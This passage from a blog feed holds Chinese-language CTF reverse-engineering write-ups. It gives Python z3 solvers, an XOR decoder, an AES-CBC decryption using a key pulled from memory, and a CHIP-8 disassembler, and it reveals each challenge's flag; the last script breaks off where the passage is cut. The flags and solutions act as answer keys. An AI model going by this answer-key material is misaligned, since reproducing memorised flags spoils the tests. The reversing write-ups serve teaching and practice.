        <content type="html"><![CDATA[<p>赛题出的很有水平啊，第一天出去玩了一天，第二天才开始做，只做出了这么几题，看了一下firmware是个虚拟机，再多点时间应该也可以出</p><span id="more"></span><h2 id="侧防"><a href="#侧防" class="headerlink" title="侧防"></a>侧防</h2><p>这题比较简单，放在了，没有放在re分类，直接上脚本</p><pre><code class="python">byte_4010 = [0x51, 0x57, 0x42, 0x6C, 0x6F, 0x67, 0x73]target = &quot;Lx|dTUwe\\IvNhCBOLqDNfW&#125;ImFZCtiyxO\\PW^ebD&quot;f = []for i in range(0, len(target), 4):   f.append(target[i + 1])   f.append(target[i + 2])   f.append(target[i + 3])   f.append(target[i])flag = &quot;&quot;for i, c in enumerate(f):   flag += chr((ord(c) - 65) ^ byte_4010[i % 7])print(flag)# flag&#123;QWB_water_problem_give_you_the_score&#125;</code></pre><h2 id="xx-warmup-obf"><a href="#xx-warmup-obf" class="headerlink" title="xx_warmup_obf"></a>xx_warmup_obf</h2><p>混淆+花指令+反调，从read或者strlen函数开始找起会比较方便，找到之后发现一位一位计算，为了节省时间，代码跑出一部分之后后面的flag可以直接猜出来</p><pre><code class="python">from z3 import *def RecurOr(flags, models, pos=0):   if pos &lt;= len(flags) - 1:       return Or(models[flags[pos]] != flags[pos], RecurOr(flags, models, pos + 1))   else:       return Or(models[flags[pos]] != flags[pos])f = [BitVec(&#39;v%d&#39; % i, 16) for i in range(22)]flag = []solver = Solver()for c in f:   solver.add(c &gt;= 0x0)   solver.add(c &lt;= 0xff)solver.add(f[0] == ord(&#39;f&#39;))solver.add(f[1] == ord(&#39;l&#39;))solver.add(f[2] == ord(&#39;a&#39;))solver.add(f[3] == ord(&#39;g&#39;))solver.add(f[4] == ord(&#39;&#123;&#39;))solver.add((f[5] * 0x1eb9d + f[2] * 0x40a8c + f[3] * 0x3fb3f + f[4] * 0xfffb82cd + f[1] * 0xffffea88 + f[0] * 0xfffda7c3) &amp; 0xffffffff == 0xc78321)solver.add((f[6] * 0xfffd185d + f[5] * 0xfffe032d + f[2] * 0xfffc468a + f[3] * 0xFFFC0EA3 + f[4] * 0xFFFE5277 + f[1] * 0xfffc4328 + f[0] * 0x44DE) &amp; 0xffffffff == 0xF961DAEB)solver.add((f[6] * 0x35770 + f[5] * 0x1CC39 + f[2] * 0x4851 + f[3] * 0xFFFFE5B9 + f[4] * 0x36D92 + f[1] * 0xFFFCF9E1 + f[0] * 0x37C38 + f[7] * 0x4186D)&amp; 0xffffffff == 0x4B202E4)solver.add((f[6] * 0xFFFC4AB1 + f[5] * 0x0CB64 + f[2] * 0x1309E + f[3] * 0xFFFB995E + f[4] * 0x2E940 + f[1] * 0xFFFEB612 + f[0] * 0xFFFC631A + f[7] * 0xFFFCAA83 + f[8] * 0x16A0C) &amp; 0xffffffff == 0xFCDE9AB5)solver.add((f[6] * 0x37EB9 + f[5] * 0xFFFDD238 + f[2] * 0xFFFBE2C0 + f[3] * 0x17977 + f[4] * 0x29D39 + f[1] * 0xFFFBB74E + f[0] * 0xFFFD6E33 + f[7] * 0xFFFF0427 + f[8] * 0xFFFD0153 + f[9] * 0xFFFF66A5) &amp; 0xffffffff == 0xFBC7B90A)solver.add((f[6] * 0x1DAAC + f[5] * 0xFFFE92AC + f[2] * 0xFFFF9AD4 + f[3] * 0x2C78D + f[4] * 0xFFFC69EE + f[1] * 0xFFFC1736 + f[0] * 0x47762 + f[7] * 0x28557 + f[8] * 0x27B6D + f[9] * 0xFFFF7F4E + f[10] * 0x2F9DF) &amp; 0xffffffff == 0x1AF43AB)solver.add((f[6] * 0xFFFDFD46 + f[5] * 0xFFFBD6F6 + f[2] * 0x13A87 + f[3] * 0x42997 + f[4] * 0x244E9 + f[1] * 0x20A60 + f[0] * 0x0C3F6 + f[7] * 0xFFFC0F74 + f[8] * 0xFFFE4DC8 + f[9] * 0xFFFE94DC + f[10] * 0xFFFFECB4 + f[11] * 0xFFFD79C6) &amp; 0xffffffff == 0xFEAFEC1F)solver.add((f[6] * 0xFFFE7848 + f[5] * 0x23EE3 + f[2] * 0xFFFCBAB4 + f[3] * 0x27C92 + f[4] * 0xFFFBFD5C + f[1] * 0xFFFD30C3 + f[0] * 0x5009 + f[7] * 0xFFFE93F1 + f[8] * 0xFFFDE3F3 + f[9] * 0x228DC + f[10] * 0x25EE + f[11] * 0xF242 + f[12] * 0x1160E) &amp; 0xffffffff == 0xFE20EC14)solver.add((f[6] * 0x648B + f[5] * 0xFFFCF002 + f[2] * 0xFFFE2E15 + f[3] * 0x1E041 + f[4] * 0x594B + f[1] * 0xFFFF3713 + f[0] * 0xFFFED96C + f[7] * 0x1C620 + f[8] * 0xFFFF282A + f[9] * 0xFFFF0E48 + f[10] * 0xFFFEAC54 + f[11] * 0xEA5F + f[12] * 0x35CF4 + f[13] * 0xFFFC920E) &amp; 0xffffffff == 0xFDCA76A0)solver.add((f[6] * 0x107E1 + f[5] * 0x440D9 + f[2] * 0xFFFFF5C3 + f[3] * 0x30766 + f[4] * 0x21281 + f[1] * 0x235C2 + f[0] * 0x1B2CE + f[7] * 0x16687 + f[8] * 0x493EC + f[9] * 0x26716 + f[0xA] * 0xFFFC84CB + f[0xB] * 0xFFFEA6FA + f[0xC] * 0xFFFC2F98 + f[0xD] * 0xFFFD1A3E + f[0xE] * 0x390BF) &amp; 0xffffffff == 0x5920B01)solver.add((f[6] * 0x24225 + f[5] * 0xFFFD39FC + f[2] * 0x1EAE2 + f[3] * 0x2F613 + f[4] * 0xFFFC66F9 + f[1] * 0xFFFE0433 + f[0] * 0x3E19 + f[7] * 0x1BDFF + f[8] * 0xFFFC6EAB + f[9] * 0xFFFD810C + f[0xA] * 0x0D519 + f[0xB] * 0x384EC + f[0xC] * 0x197E5 + f[0xD] * 0xFFFFD159 + f[0xE] * 0xFFFF43D9 + f[0xF] * 0xFFFC28DF) &amp; 0xffffffff == 0xFDD0E812)solver.add((f[6] * 0x111A3 + f[5] * 0xFFFF32EB + f[2] * 0x3E3F9 + f[3] * 0xFFFE9E4B + f[4] * 0xFFFFFB1A + f[1] * 0xFFFF65B9 + f[0] * 0xFFFDF970 + f[7] * 0xFFFB936C + f[8] * 0xFFFEF482 + f[9] * 0x57B6 + f[0xA] * 0x8813 + f[0xB] * 0x25CDC + f[0xC] * 0x12190 + f[0xD] * 0x427BE + f[0xE] * 0xFFFC8358 + f[0xF] * 0xFFFCE4EE + f[0x10] * 0x43BB5) &amp; 0xffffffff == 0xFF9ADC73)solver.add((f[6] * 0xFFFC313D + f[5] * 0x1023B + f[2] * 0x2E27A + f[3] * 0xFFFDCCD4 + f[4] * 0xFFFE498F + f[1] * 0xFFFFEC0D + f[0] * 0x3A1A3 + f[7] * 0xFFFCC8E2 + f[8] * 0xFFFC37B6 + f[9] * 0xFFFF2FE9 + f[0xA] * 0xFFFE8E68 + f[0xB] * 0x1F45C + f[0xC] * 0xFFFEAC48 + f[0xD] * 0xFFFDBD08 + f[0xE] * 0x2A28 + f[0xF] * 0xD72D + f[0x10] * 0xFFFF70B8 + f[0x11] * 0xFFFFE90F) &amp; 0xffffffff == 0xFCD6008F)solver.add((f[6] * 0xFFFBB7A0 + f[5] * 0xFFFF0015 + f[2] * 0xFFFD2918 + f[3] * 0x1882D + f[4] * 0xFFFEDE1F + f[1] * 0x2FB77 + f[0] * 0x20D94 + f[7] * 0x14A94 + f[8] * 0xFFFDA0CD + f[9] * 0xDE69 + f[0xA] * 0x2FE8 + f[0xB] * 0x2ABE5 + f[0xC] * 0x26530 + f[0xD] * 0x4C3D + f[0xE] * 0x2383E + f[0xF] * 0x42763 + f[0x10] * 0xE5C9 + f[0x11] * 0x539 + f[0x12] * 0xFFFC5AF3) &amp; 0xffffffff == 0x39F3331)solver.add((f[6] * 0xFFFD67BD + f[5] * 0xFFFCFC61 + f[2] * 0x21FB1 + f[3] * 0x2AFE7 + f[4] * 0xFFFE2316 + f[1] * 0xFFFDE3DE + f[0] * 0xFFFCF431 + f[7] * 0xFFFF1A07 + f[8] * 0xFFFD1877 + f[9] * 0xFFFBAB46 + f[0xA] * 0xFFFFB7A8 + f[0xB] * 0x44C76 + f[0xC] * 0x3C062 + f[0xD] * 0x26DA8 + f[0xE] * 0x217FE + f[0xF] * 0x27911 + f[0x10] * 0xD484 + f[0x11] * 0x217F6 + f[0x12] * 0xFFFF711C + f[0x13] * 0xFFFE6835) &amp; 0xffffffff == 0x4AF658)solver.add((f[6] * 0x6C67 + f[5] * 0x4210C + f[2] * 0x24372 + f[3] * 0xFFFF64A1 + f[4] * 0xFFFE83FC + f[1] * 0xFFFC59E3 + f[0] * 0x1A675 + f[7] * 0x29403 + f[8] * 0x122E6 + f[9] * 0x479E1 + f[0xA] * 0xFFFE556B + f[0xB] * 0xFFFEE2E8 + f[0xC] * 0xFFFD0C98 + f[0xD] * 0xF761 + f[0xE] * 0xFFFCF4FD + f[0xF] * 0x24A14 + f[0x10] * 0x2C39B + f[0x11] * 0xFFFF914F + f[0x12] * 0x94F9 + f[0x13] * 0x1F3A9 + f[0x14] * 0xFFFD85A7) &amp; 0xffffffff == 0x2B77651)solver.add((f[6] * 0x0B245 + f[5] * 0x47951 + f[2] * 0x3C177 + f[3] * 0x2026C + f[4] * 0x2BD3A + f[1] * 0x0AE83 + f[0] * 0xFFFF67E2 + f[7] * 0x0FC81 + f[8] * 0xFFFD1DCD + f[9] * 0xFFFE7D87 + f[0xA] * 0x40428 + f[0xB] * 0x1AC25 + f[0xC] * 0x47B95 + f[0xD] * 0xFFFBD35D + f[0xE] * 0xFFFD55C5 + f[0xF] * 0x255EF + f[0x10] * 0xFFFCA285 + f[0x11] * 0x1B4F2 + f[0x12] * 0xFFFBA306 + f[0x13] * 0x3B929 + f[0x14] * 0xEC4C+f[0x15]*0xFFFCD49C) &amp; 0xffffffff == 0x49F26C9)while solver.check() == sat:   flag = &quot;&quot;   model = solver.model()   for i in range(len(f)):       flag += chr(model[f[i]].as_long())       print(flag)       solver.add(RecurOr(f, model))# flag&#123;g0_Fuck_xx_5egm3n</code></pre><p>根据题目描述，<code>先做这个热热身，做完这个再去做xx_segment_obf也不迟</code>，猜测flag为</p><pre><code>flag&#123;g0_Fuck_xx_5egm3nt_0bf&#125;</code></pre><p>提交成功</p><h2 id="imitation-game"><a href="#imitation-game" class="headerlink" title="imitation_game"></a>imitation_game</h2><p>运行程序，首先输出flag提示，flag有两部分，先过第一部分才会运行第二部分的程序</p><p>调试程序，调试过程中发现AES的s-box，发现输入了明文之后在后面pad了32位\x1a，然后进行AES-CBC加密，密钥和iv还有最终运行的结果可以在内存里找到，直接解密</p><pre><code class="python">from Crypto.Cipher import AESfrom binascii import b2a_hex, a2b_hexdef add_to_16(text):   if len(text.encode(&#39;utf-8&#39;)) % 16:       add = 16 - (len(text.encode(&#39;utf-8&#39;)) % 16)   else:       add = 0   text = text + (&#39;\0&#39; * add)   return text.encode(&#39;utf-8&#39;)def encrypt(text):   key = b&quot;\x3E\x2C\x25\x13\x18\xBE\xC3\x6B\xA1\x37\x24\x53\x03\x1E\x51\xEC&quot;   iv = b&quot;\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2A\x2B\x2C\x2D\x2E\x2F&quot;   mode = AES.MODE_CBC   text = add_to_16(text)   cryptos = AES.new(key, mode, iv)   cipher_text = cryptos.encrypt(text)   return b2a_hex(cipher_text)def decrypt(text):   key = b&quot;\x3E\x2C\x25\x13\x18\xBE\xC3\x6B\xA1\x37\x24\x53\x03\x1E\x51\xEC&quot;   iv = b&quot;\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2A\x2B\x2C\x2D\x2E\x2F&quot;   mode = AES.MODE_CBC   cryptos = AES.new(key, mode, iv)   plain_text = cryptos.decrypt(a2b_hex(text))   return plain_textif __name__ == &#39;__main__&#39;:   e = encrypt(&quot;6c8f1d78770fe672122478c6f9a150e8\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a&quot;)   d = decrypt(b&quot;9D7BA23CB1099A4841D16663D6AE3CAB87ED59C2D3DA2A05BA5129C15D426A9A0514DBBEAE838B6FD3594152344E39C566E1E3EC0618149F4EB770009077D8AE&quot;)   print(&quot;加密:&quot;, e)   print(&quot;解密:&quot;, d)# 6c8f1d78770fe672122478c6f9a150e8</code></pre><p>得到第一部分flag，进入第二部分，调用了game.bin文件，根据提示是一个chip8的模拟器，一共输入10位数，错误则提示dead</p><p>有了提示之后好做了很多，根据chip8的指令集解析一下game.bin文件</p><pre><code class="python">with open(&#39;game.txt&#39;, &#39;r+&#39;) as f:   s = f.read()   # print(s)j = 0for i in range(0, len(s), 5):   t = s[i:i + 4]   # print(t)   print(&quot;addr:&quot; + hex(j + 0x200), end=&quot;   &quot;)   j += 2   if t[0] == &#39;0&#39;:       if t[1] == &#39;0&#39; and t[2] == &#39;e&#39;:          if t[3] == &#39;1&#39;:              print(&quot;clear screen&quot;)          elif t[3] == &#39;f&#39;:              print(&quot;Returns from a subroutine&quot;)          else:              print(&quot;call program at addr: &quot; + t[1:])       else:           print(&quot;call program at addr: &quot; + t[1:])   elif t[0] == &#39;1&#39;:       print(&quot;jmp &quot; + t[1:])   elif t[0] == &#39;2&#39;:       print(&quot;call &quot; + t[1:])   elif t[0] == &#39;3&#39;:       print(&quot;Skips the next instruction if V&quot; + t[1] + &quot; equals &quot; + t[2:])   elif t[0] == &#39;4&#39;:       print(&quot;Skips the next instruction if V&quot; + t[1] + &quot; not equals &quot; + t[2:])   elif t[0] == &#39;5&#39;:       print(&quot;Skips the next instruction if V&quot; + t[1] + &quot; equals V&quot; + t[2])   elif t[0] == &#39;6&#39;:       print(&quot;V&quot; + t[1] + &quot; = &quot; + t[2:])   elif t[0] == &#39;7&#39;:       print(&quot;V&quot; + t[1] + &quot; += &quot; + t[2:])   elif t[0] == &#39;8&#39;:       VX = &quot;V&quot; + t[1]       VY = &quot;V&quot; + t[2]       if t[-1] == &#39;0&#39;:           print(VX + &quot; = &quot; + VY)       elif t[-1] == &#39;1&#39;:           print(VX + &quot; = &quot; + VX + &quot; | &quot; + VY)       elif t[-1] == &#39;2&#39;:           print(VX + &quot; = &quot; + VX + &quot; &amp; &quot; + VY)       elif t[-1] == &#39;3&#39;:           print(VX + &quot; = &quot; + VX + &quot; ^ &quot; + VY)       elif t[-1] == &#39;4&#39;:           print(VX + &quot; += &quot; + VY, &quot; set VF=1 if VX&gt;=255&quot;)       elif t[-1] == &#39;5&#39;:           print(VX + &quot; -= &quot; + VY, &quot; set VF=0 if VX&lt;=0&quot;)       elif t[-1] == &#39;6&#39;:           print(VX + &quot; &gt;&gt;= 1&quot;, &quot; the last one to VF&quot;)       elif t[-1] == &#39;7&#39;:           print(VX + &quot; = &quot; + VY + &quot; - &quot; + VX, &quot; set VF=0 if VX&amp;lt;0&quot;)       elif t[-1] == &#39;e&#39;:           print(VX + &quot; &lt;&lt;= 1&quot;, &quot; the first one to VF&quot;)       else:           print(&quot;Invalid instruction: &quot; + t)   elif t[0] == &#39;9&#39;:       print(&quot;Skips the next instruction if V&quot; + t[1] + &quot; not equals V&quot; + t[2])   elif t[0] == &#39;a&#39;:       print(&quot;set I = &quot; + t[1:])   elif t[0] == &#39;b&#39;:       print(&quot;jmp V0+&quot; + t[1:])   elif t[0] == &#39;c&#39;:       print(&quot;V&quot; + t[1] + &quot;=rand()&amp;&quot; + t[2:])   elif t[0] == &#39;d&#39;:       print(&quot;display at (V&quot; + t[1] + &quot;,&quot; + &quot;V&quot; + t[2] + &quot;) for &quot; + t[3] + &quot;rows&quot;)   elif t[0] == &#39;e&#39;:       print(&quot;something about buttons&quot;)   elif t[0] == &#39;f&#39;:       if t[2:] == &#39;29&#39;:           print(&quot;set I=&quot; + &quot;V&quot; + t[1])       elif t[2:] == &quot;0a&quot;:           print(&quot;set V&quot; + t[1] + &quot; = button pressed&quot;)       elif t[2:] == &quot;55&quot;:           print(&quot;store V0-V&quot; + t[1] + &quot; to addr start at I&quot;)       elif t[2:] == &quot;65&quot;:           print(&quot;store addr start at I to V0-V&quot; + t[1])       elif t[2:] == &quot;33&quot;:           print(&quot;set BCD(V&quot; + t[1] + &quot;)&quot;)       else:           print(t[2:])   else:       print(&quot;Invalid instruction: &quot; + t)</code></pre><p>解析之后根据程序的运行流程看一下大概过程，读取按键在屏幕上指定位置显示出来，直到10位都读取完，然后进行一些判断，错误就会显示dead，正确直接退出程序，不会有显示。然后详细看一下程序</p><p>程序开始一个跳转从2ce开始，根据chip8内存的排布规律，可执行代码从200开始</p><pre><code>addr:0x2ce   Ve = 10addr:0x2d0   set I=Veaddr:0x2d2   store V0-Ve to addr start at Iaddr:0x2d4   Vf = 03addr:0x2d6   Ve += Vf  set VF=1 if VX&gt;=255addr:0x2d8   call 928addr:0x2da   V0 = Vfaddr:0x2dc   V1 = 05addr:0x2de   V2 = 08addr:0x2e0   V3 = V0addr:0x2e2   set I=Veaddr:0x2e4   store V0-Ve to addr start at Iaddr:0x2e6   Vf = 03addr:0x2e8   Ve += Vf  set VF=1 if VX&gt;=255addr:0x2ea   V0 = V1addr:0x2ec   V1 = V2addr:0x2ee   V2 = V3addr:0x2f0   call 938</code></pre><p>首先是10个这样的过程用于输入和显示</p><p>其中928用于读取输入，记录按键信息</p><pre><code>addr:0x928   V0 = ffaddr:0x92a   set V0 = button pressedaddr:0x92c   Vf = 03addr:0x92e   Ve -= Vf  set VF=0 if VX&lt;=0addr:0x930   Vf = V0addr:0x932   set I=Veaddr:0x934   store addr start at I to V0-Veaddr:0x936   Returns from a subroutine</code></pre><p>938用于输出到显示屏上</p><pre><code>addr:0x938   V5 = V2addr:0x93a   V4 = V1addr:0x93c   V3 = V0addr:0x93e   V6 = 00addr:0x940   set BCD(V5)addr:0x942   store addr start at I to V0-V2addr:0x944   set I=V5addr:0x946   display at (V3,V4) for 5rowsaddr:0x948   V6 = V6 | Vfaddr:0x94a   Vf = 03addr:0x94c   Ve -= Vf  set VF=0 if VX&amp;lt;0addr:0x94e   Vf = V6addr:0x950   set I=Veaddr:0x952   store addr start at I to V0-Veaddr:0x954   Returns from a subroutine</code></pre><p>经过10次这样的操作之后，显示屏上显示出10个输入的数，分别存储在寄存器V0到V9中，接下来对这些输入的数值进行处理</p><pre><code>addr:0x436   Va = Vfaddr:0x438   Va = V0addr:0x43a   Vb = V0addr:0x43c   Vc = 02addr:0x43e   Vb += Vc  set VF=1 if VX&gt;=255addr:0x440   Va = Vbaddr:0x442   V0 = Vaaddr:0x444   Va = V1addr:0x446   Vb = V1addr:0x448   Vc = 01addr:0x44a   Vb += Vc  set VF=1 if VX&gt;=255addr:0x44c   Va = Vbaddr:0x44e   V1 = Vaaddr:0x450   Va = V2addr:0x452   Vb = V2addr:0x454   Vc = 01addr:0x456   Vb += Vc  set VF=1 if VX&gt;=255addr:0x458   Vc = 01addr:0x45a   Vb = Vb ^ Vcaddr:0x45c   Va = Vbaddr:0x45e   V2 = Vaaddr:0x460   Va = V3addr:0x462   Vb = V3addr:0x464   Vc = 03addr:0x466   Vb += Vc  set VF=1 if VX&gt;=255addr:0x468   Va = Vbaddr:0x46a   V3 = Vaaddr:0x46c   Va = V4addr:0x46e   Vb = V4addr:0x470   Vc = 02addr:0x472   Vb += Vc  set VF=1 if VX&gt;=255addr:0x474   Va = Vbaddr:0x476   V4 = Vaaddr:0x478   Va = V5addr:0x47a   Vb = V5addr:0x47c   Vc = 02addr:0x47e   Vb = Vb ^ Vcaddr:0x480   Vc = 01addr:0x482   Vb += Vc  set VF=1 if VX&gt;=255addr:0x484   Va = Vbaddr:0x486   V5 = Vaaddr:0x488   Va = V6addr:0x48a   Vb = V6addr:0x48c   Vc = V6addr:0x48e   Vb += Vc  set VF=1 if VX&gt;=255addr:0x490   Va = Vbaddr:0x492   V6 = Vaaddr:0x494   Va = V7addr:0x496   Vb = V7addr:0x498   Vc = 01addr:0x49a   Vb += Vc  set VF=1 if VX&gt;=255addr:0x49c   Va = Vbaddr:0x49e   V7 = Vaaddr:0x4a0   Va = V8addr:0x4a2   Vb = V8addr:0x4a4   Vc = 01addr:0x4a6   Vb = Vb ^ Vcaddr:0x4a8   Vc = 01addr:0x4aa   Vb += Vc  set VF=1 if VX&gt;=255addr:0x4ac   Va = Vbaddr:0x4ae   V8 = Vaaddr:0x4b0   Va = V9addr:0x4b2   Vb = V9addr:0x4b4   Vc = 02addr:0x4b6   Vb += Vc  set VF=1 if VX&gt;=255addr:0x4b8   Va = Vbaddr:0x4ba   V9 = Va</code></pre><p>就是如下操作</p><pre><code class="python">f[0]+=2f[1]+=1f[2]=(f[2]+1)^1f[3]+=3f[4]+=2f[5]=(f[5]^2)+1f[6]=2*f[6]f[7]+=1f[8]=(f[8]^1)+1f[9]+=2</code></pre><p>接下来是10个方程</p><pre><code>addr:0x4bc   Va = 00addr:0x4be   Vb = Vaaddr:0x4c0   Vc = V0addr:0x4c2   Vd = 01addr:0x4c4   set I=Veaddr:0x4c6   store V0-Ve to addr start at Iaddr:0x4c8   Vf = 03addr:0x4ca   Ve += Vf  set VF=1 if VX&gt;=255addr:0x4cc   V0 = Vcaddr:0x4ce   V1 = Vdaddr:0x4d0   call 27aaddr:0x4d2   Vc = Vfaddr:0x4d4   Vb += Vc  set VF=1 if VX&gt;=255addr:0x4d6   Va = Vbaddr:0x4d8   Vb = Vaaddr:0x4da   Vc = V1addr:0x4dc   Vd = 02addr:0x4de   set I=Veaddr:0x4e0   store V0-Ve to addr start at Iaddr:0x4e2   Vf = 03addr:0x4e4   Ve += Vf  set VF=1 if VX&gt;=255addr:0x4e6   V0 = Vcaddr:0x4e8   V1 = Vdaddr:0x4ea   call 27aaddr:0x4ec   Vc = Vfaddr:0x4ee   Vb += Vc  set VF=1 if VX&gt;=255addr:0x4f0   Va = Vbaddr:0x4f2   Vb = Vaaddr:0x4f4   Vc = V2addr:0x4f6   Vd = 01addr:0x4f8   set I=Veaddr:0x4fa   store V0-Ve to addr start at Iaddr:0x4fc   Vf = 03addr:0x4fe   Ve += Vf  set VF=1 if VX&gt;=255addr:0x500   V0 = Vcaddr:0x502   V1 = Vdaddr:0x504   call 27aaddr:0x506   Vc = Vfaddr:0x508   Vb += Vc  set VF=1 if VX&gt;=255addr:0x50a   Va = Vbaddr:0x50c   Vb = Vaaddr:0x50e   Vc = 21addr:0x510   Vf = 00addr:0x512   Skips the next instruction if Vb equals Vcaddr:0x514   Vf = 01addr:0x516   Vb = Vfaddr:0x518   Skips the next instruction if Vb not equals 00addr:0x51a   jmp 52eaddr:0x51c   clear screenaddr:0x51e   Vb = Vfaddr:0x520   set I=Veaddr:0x522   store V0-Ve to addr start at Iaddr:0x524   Vf = 03addr:0x526   Ve += Vf  set VF=1 if VX&gt;=255addr:0x528   call 202</code></pre><p>202函数为输出dead函数，需要跳过，传入27a中寄存器Vd的值表示多项式前该项的系数，三个三个一组可以列出10个方程，写脚本z3求解</p><pre><code class="python">from z3 import *def RecurOr(flags, models, pos=0):    if pos &lt;= len(flags) - 1:        return Or(models[flags[pos]] != flags[pos], RecurOr(flags, models, pos + 1))    else:        return Or(models[flags[pos]] != flags[pos])f = [Int(&#39;v%d&#39; % i) for i in range(9)]flag = []solver = Solver()for c in f:    solver.add(c &gt;= 0x0)    solver.add(c &lt;= 0xff)solver.add(f[0] + 2 * f[1] + f[2] == 0x21)solver.add(2 * f[0] + f[1] + f[2] == 0x2a)solver.add(f[0] + 2 * f[1] + 2 * f[2] == 0x30)solver.add(f[3] + 2 * f[4] + f[5] == 0x37)solver.add(2 * f[3] + f[4] + f[5] == 0x37)solver.add(f[3] + 2 * f[4] + 2 * f[5] == 0x3b)solver.add(f[6] + 2 * f[7] + f[8] == 0x1f)solver.add(2 * f[6] + f[7] + f[8] == 0x16)solver.add(f[6] + 2 * f[7] + 2 * f[8] == 0x20)while solver.check() == sat:    model = solver.model()    ff = [model[f[0]].as_long() - 2, model[f[1]].as_long() - 1, (model[f[2]].as_long() ^ 1) - 1,          model[f[3]].as_long() - 3, model[f[4]].as_long() - 2, (model[f[5]].as_long() - 1) ^ 2,          model[f[6]].as_long() // 2, model[f[7]].as_long() - 1, (model[f[8]].as_long() - 1) ^ 1, 5 - 2]    print(ff)    solver.add(RecurOr(f, model))# a2def12c13</code></pre><p>两部分都得到，拼起来提交正确</p><pre><code>flag&#123;6c8f1d78770fe672122478c6f9a150e8a2def12c13&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020-信息安全竞赛创新实践赛-wp</title>
      <link href="/2020/08/28/2020-08-28-2020-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%B5%9B-wp/"/>
      <url>/2020/08/28/2020-08-28-2020-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%B5%9B-wp/</url>
      
        <content type="html"><![CDATA[<p>这国赛出的没什么意思，re就给了两道然后被打穿了，等了一天最后放出来一道智能合约……</p><span id="more"></span><h2 id="z3"><a href="#z3" class="headerlink" title="z3"></a>z3</h2><p>直接解方程组得到flag</p><pre><code class="python">target = [0x00004F17, 0x00009CF6, 0x00008DDB, 0x00008EA6, 0x00006929, 0x00009911, 0x000040A2, 0x00002F3E, 0x000062B6,0x00004B82, 0x0000486C, 0x00004002, 0x000052D7, 0x00002DEF, 0x000028DC, 0x0000640D, 0x0000528F, 0x0000613B,0x00004781, 0x00006B17, 0x00003237, 0x00002A93, 0x0000615F, 0x000050BE, 0x0000598E, 0x00004656, 0x00005B31,0x0000313A, 0x00003010, 0x000067FE, 0x00004D5F, 0x000058DB, 0x00003799, 0x000060A0, 0x00002750, 0x00003759,0x00008953, 0x00007122, 0x000081F9, 0x00005524, 0x00008971, 0x00003A1D]from z3 import *def RecurOr(flags, models, pos=0):   if (pos &amp;lt; len(flags) - 1):       return Or(models[flags[pos]] != flags[pos], RecurOr(flags, models, pos + 1))   else:       return Or(models[flags[pos]] != flags[pos])v = [Int(&#39;v%d&#39; % (i + 46)) for i in range(42)]flag = []solver = Solver()for c in v:   solver.add(c &gt;= 0x0)   solver.add(c &lt;= 0xff)v46 = v[0]v47 = v[1]v48 = v[2]v49 = v[3]v50 = v[4]v51 = v[5]v52 = v[6]v53 = v[7]v54 = v[8]v55 = v[9]v56 = v[10]v57 = v[11]v58 = v[12]v59 = v[13]v60 = v[14]v61 = v[15]v62 = v[16]v63 = v[17]v64 = v[18]v65 = v[19]v66 = v[20]v67 = v[21]v68 = v[22]v69 = v[23]v70 = v[24]v71 = v[25]v72 = v[26]v73 = v[27]v74 = v[28]v75 = v[29]v76 = v[30]v77 = v[31]v78 = v[32]v79 = v[33]v80 = v[34]v81 = v[35]v82 = v[36]v83 = v[37]v84 = v[38]v85 = v[39]v86 = v[40]v87 = v[41]solver.add(target[0] == 34 * v49 + 12 * v46 + 53 * v47 + 6 * v48 + 58 * v50 + 36 * v51 + v52)solver.add(target[1] == 27 * v50 + 73 * v49 + 12 * v48 + 83 * v46 + 85 * v47 + 96 * v51 + 52 * v52)solver.add(target[2] == 24 * v48 + 78 * v46 + 53 * v47 + 36 * v49 + 86 * v50 + 25 * v51 + 46 * v52)solver.add(target[3] == 78 * v47 + 39 * v46 + 52 * v48 + 9 * v49 + 62 * v50 + 37 * v51 + 84 * v52)solver.add(target[4] == 48 * v50 + 14 * v48 + 23 * v46 + 6 * v47 + 74 * v49 + 12 * v51 + 83 * v52)solver.add(target[5] == 15 * v51 + 48 * v50 + 92 * v48 + 85 * v47 + 27 * v46 + 42 * v49 + 72 * v52)solver.add(target[6] == 26 * v51 + 67 * v49 + 6 * v47 + 4 * v46 + 3 * v48 + 68 * v52)solver.add(target[7] == 34 * v56 + 12 * v53 + 53 * v54 + 6 * v55 + 58 * v57 + 36 * v58 + v59)solver.add(target[8] == 27 * v57 + 73 * v56 + 12 * v55 + 83 * v53 + 85 * v54 + 96 * v58 + 52 * v59)solver.add(target[9] == 24 * v55 + 78 * v53 + 53 * v54 + 36 * v56 + 86 * v57 + 25 * v58 + 46 * v59)solver.add(target[10] == 78 * v54 + 39 * v53 + 52 * v55 + 9 * v56 + 62 * v57 + 37 * v58 + 84 * v59)solver.add(target[11] == 48 * v57 + 14 * v55 + 23 * v53 + 6 * v54 + 74 * v56 + 12 * v58 + 83 * v59)solver.add(target[12] == 15 * v58 + 48 * v57 + 92 * v55 + 85 * v54 + 27 * v53 + 42 * v56 + 72 * v59)solver.add(target[13] == 26 * v58 + 67 * v56 + 6 * v54 + 4 * v53 + 3 * v55 + 68 * v59)solver.add(target[14] == 34 * v63 + 12 * v60 + 53 * v61 + 6 * v62 + 58 * v64 + 36 * v65 + v66)solver.add(target[15] == 27 * v64 + 73 * v63 + 12 * v62 + 83 * v60 + 85 * v61 + 96 * v65 + 52 * v66)solver.add(target[16] == 24 * v62 + 78 * v60 + 53 * v61 + 36 * v63 + 86 * v64 + 25 * v65 + 46 * v66)solver.add(target[17] == 78 * v61 + 39 * v60 + 52 * v62 + 9 * v63 + 62 * v64 + 37 * v65 + 84 * v66)solver.add(target[18] == 48 * v64 + 14 * v62 + 23 * v60 + 6 * v61 + 74 * v63 + 12 * v65 + 83 * v66)solver.add(target[19] == 15 * v65 + 48 * v64 + 92 * v62 + 85 * v61 + 27 * v60 + 